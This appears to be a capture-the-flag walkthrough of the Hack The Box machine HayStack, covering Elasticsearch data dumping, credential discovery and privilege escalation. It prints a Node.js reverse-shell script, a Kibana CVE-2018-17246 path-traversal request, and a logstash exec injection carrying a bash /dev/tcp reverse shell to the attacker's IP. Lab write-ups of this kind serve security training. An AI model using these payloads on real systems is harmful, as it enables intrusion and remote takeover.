# HayStack

![eyER9x.png](https://s2.ax1x.com/2019/08/04/eyER9x.png)

## Introduction

HayStack is an easy box in hack the box. But it does isn't easy at all. It's annoying to find the user and password in the messy Spanish. For the root, you should have a basic understanding of ELK. Hence, the box is quite fresh in htb.

## Information Enumeration

As usual, nmap is utilized to detect detailed ports and services.

```
# Nmap 7.70 scan initiated Sun Jun 30 01:10:53 2019 as: nmap -sT -p- --min-rate 1500 -oN ports 10.10.10.115
Nmap scan report for 10.10.10.115
Host is up (0.27s latency).
Not shown: 65532 filtered ports
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
9200/tcp open  wap-wsp
```

Then detect the detailed services:

```
# Nmap 7.70 scan initiated Sun Jun 30 01:13:05 2019 as: nmap -sC -sV -p22,80,9200 -oN services 10.10.10.115
Nmap scan report for 10.10.10.115
Host is up (0.38s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey:
|   2048 2a:8d:e2:92:8b:14:b6:3f:e4:2f:3a:47:43:23:8b:2b (RSA)
|   256 e7:5a:3a:97:8e:8e:72:87:69:a3:0d:d1:00:bc:1f:09 (ECDSA)
|_  256 01:d2:59:b2:66:0a:97:49:20:5f:1c:84:eb:81:ed:95 (ED25519)
80/tcp   open  http    nginx 1.12.2
|_http-server-header: nginx/1.12.2
|_http-title: Site doesn't have a title (text/html).
9200/tcp open  http    nginx 1.12.2
|_http-server-header: nginx/1.12.2
|_http-title: 502 Bad Gateway
```

For port 80, we find nothing except a picture of a needle. Exiftool is used to analyze. But nothing interesting found. Try to use gobuster to brute force the directory, but have not found any useful directories.

![eDD780.png](https://s2.ax1x.com/2019/08/03/eDD780.png)

For port 9200, nmap seems to be failed to detect. But this port should be familiar to elasticserarch users. Elasticsearch is a popular search database in recent years. Something is interesting in elasticsearch. We will talk about this later.

![eDrFKO.png](https://s2.ax1x.com/2019/08/03/eDrFKO.png)

## Exploit

In the above, we have talked about the ports. The elasticsearch should be the point. Try to obtain the data of elasticsearch. There is no authentication for elasticsearch in default. Hence, we can read the data from elasticsearh. In the beginning, I have tried to use kibana to analyze the data. Kibana is one component of ELK, which is a powerful tool to analyze the data of elasticsearch. And it's easy to use. Just download the [files](https://www.elastic.co/cn/downloads/past-releases/kibana-6-4-2), then decompress the files. There is only one step to finish before run kibana. Modify `elasticsearch.url` in `config.yml`, it should be configured to `10.10.10.115:9200`. Then you can run kibana directly.

When you access to kibana, you will find two indexes: `bank` and `quotes`. The `bank` seems to be data of bank users information, which seems not to be useful. For index `quotes`, we have found nothing but the quote of Spanish. To be honest, Spanish is really messy for me to read. And I cannot find anything interesting. Kibana is useful for query specific field. But `quotes` seems to be an article. So I decide to dump all the data of `quotes`. 

[elasticsearh-dump](https://github.com/taskrabbit/elasticsearch-dump) is useful to dump the data from elasticsearch. Firstly, install the tool by `npm install elasticdump -g`. Then dump the data by: 

```
elasticdump \
  --input=http://production.es.com:9200/quotes \
  --output=quptes.json \
  --type=data
```

The result will be json file of a list of objects consist of some keys. The most important is the quote in the result. But the json is still not convenient to read. And the id may be the sequence of quotes. So, I decide to write a script to order the quotes by id and join all the quotes together.

```python
import json
result = {}
txt = ""
with open("quotes.json") as f:
  data = f.readlines()
  for ele in data:
    obj = json.loads(ele)
    id = int(obj["_id"])
    result[id] = obj["_source"]["quote"]
  for i in sorted(result.keys()):
    print(i)
    txt = txt + result[i] + "\n\n"
with open("result.md", "w") as f1:
  f1.write(txt)
```

Now, I have the result of quotes. And it's easy to read. I place this file in Github. When I read this file by Chrome, Chrome can help me translate this article. So, it's easier to find special things in the article. I have found two interesting strings in the article.

```
Tengo que guardar la clave para la maquina: dXNlcjogc2VjdXJpdHkg
```

```
Esta clave no se puede perder, la guardo aca: cGFzczogc3BhbmlzaC5pcy5rZXk=
```

If you translate the two stings into English respectively.

```
I have to save the password for the machine: dXNlcjogc2VjdXJpdHkg
```

```
This key cannot be lost, I keep it here: cGFzczogc3BhbmlzaC5pcy5rZXk=
```

The end of the strings is encoded by base64. When decoded, we can find the username and password. Then you can ssh by the username and password. 

![erZrTA.png](https://s2.ax1x.com/2019/08/03/erZrTA.png)

To be honest, I don't like the user of the box. But it does works as the keyword: you have to find a needle in haystack.

## PrivEsc

If you look around the box, you will find the box is installed with ELK. You can find kibana and logstash in the box. If you google `kibana exploit`. You will find [CVE-2018-17246](https://github.com/mpgn/CVE-2018-17246) in Github. It has detailed illustrates the ways to exploit.

However, there is a problem that the kibana service is only running in local. So you cannot access kibana service externally. There is a way to utilize ssh to redirect the network stream.

```
ssh 5601:localhost:5601 security@10.10.10.115
```

Then, we can access to the kibana service in 10.10.10.115 by access to `localhost:5601`. Place the `server.js` in tmp directory of the target machine.

```
// server.js
(function(){
    var net = require("net"),
        cp = require("child_process"),
        sh = cp.spawn("/bin/sh", []);
    var client = new net.Socket();
    client.connect(1234, "10.10.16.61", function(){
        client.pipe(sh.stdin);
        sh.stdout.pipe(client);
        sh.stderr.pipe(client);
    });
    return /a/; // Prevents the Node.js application form crashing
})();
```

Then we can implement by burp, remember to set up nc listener `nc -lvnp 1234`

```
GET /api/console/api_server?sense_version=@@SENSE_VERSION&apis=../../../../../../.../../../../tmp/server.jssudo -l HTTP/1.1
Host: localhost:5601
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://localhost:5601/app/kibana
content-type: application/json
kbn-version: 6.4.2
origin: http://localhost:5601
Connection: close
```

Wait for a while, then we are kibana.

[![erlWZT.png](https://s2.ax1x.com/2019/08/03/erlWZT.png)](https://imgchr.com/i/erlWZT)

But we are still not root! Don't be upset. Let's move on. If we look at the logstash in the machine carefully, we will find something interesting. We find the group `kibana` has write permission of conf.d of logstash.

```
ls -lah
total 52K
drwxr-xr-x.  3 root   root    183 jun 18 22:15 .
drwxr-xr-x. 83 root   root   8,0K jun 24 05:44 ..
drwxrwxr-x.  2 root   kibana   62 jun 24 08:12 conf.d
-rw-r--r--.  1 root   kibana 1,9K nov 28  2018 jvm.options
-rw-r--r--.  1 root   kibana 4,4K sep 26  2018 log4j2.properties
-rw-r--r--.  1 root   kibana  342 sep 26  2018 logstash-sample.conf
-rw-r--r--.  1 root   kibana 8,0K ene 23  2019 logstash.yml
-rw-r--r--.  1 root   kibana 8,0K sep 26  2018 logstash.yml.rpmnew
-rw-r--r--.  1 root   kibana  285 sep 26  2018 pipelines.yml
-rw-------.  1 kibana kibana 1,7K dic 10  2018 startup.option
```

`conf.d` is the config directory of logstash consists of three files in general. Take a deep look into the directory, you'll find an interesting thing. There is a command executes in output.conf. If you have basic knowledge of logstash, you should know the function of the three files. `input.conf` is used to config the data source. `filter.conf` is used to process the data, which is usually combined with grok. `output.conf` is used to output the processed data. We can find there is an exec in the `output.conf`.

So the exploit is very clear. Create a file in `/opt/kibana/` whose name begins with `logstah_`. And make sure the content in the file can be parsed by grok correctly. Then the command can be executed successfully. The most important part is how to create the content to be parsed to correct `comando`. So you should know how to use grok. Grok is utilized to recognize specific fields by the regular expression. [Grok Debugger] is a useful tool to test grok online.

![eyPIxg.png](https://s2.ax1x.com/2019/08/04/eyPIxg.png)

The expression is quite simple. If you know the regular expression, it will not be hard to understand the expression here.

**filter.conf**

```
filter {
        if [type] == "execute" {
                grok {
                        match => { "message" => "Ejecutar\s*comando\s*:\s+%{GREEDYDATA:comando}" }
                }
        }
}
```

**input.conf**

```
input {
        file {
                path => "/opt/kibana/logstash_*"
                start_position => "beginning"
                sincedb_path => "/dev/null"
                stat_interval => "10 second"
                type => "execute"
                mode => "read"
        }
}
```

**output.conf**

```
output {
        if [type] == "execute" {
                stdout { codec => json }
                exec {
                        command => "%{comando} &"
                }
        }
}
```

Now, we have known how to create the corresponding `comando`. The next step is to choose the command to execute. There is not nc in the machine. But there's python and perl in the machine. But the reverse shell command is a little long. So I choose to use `bash -i >& /dev/tcp/10.10.16.61/1234 0>&1`. Write the content to the corresponding file:

```
echo "Ejecutar  comando: bash -i >& /dev/tcp/10.10.16.61/1234 0>&1" > /opt/kibana/logstash_1.txt
```

Use the nc to listen at port 1234, wait a while, root is coming.

![eykUVs.png](https://s2.ax1x.com/2019/08/04/eykUVs.png)
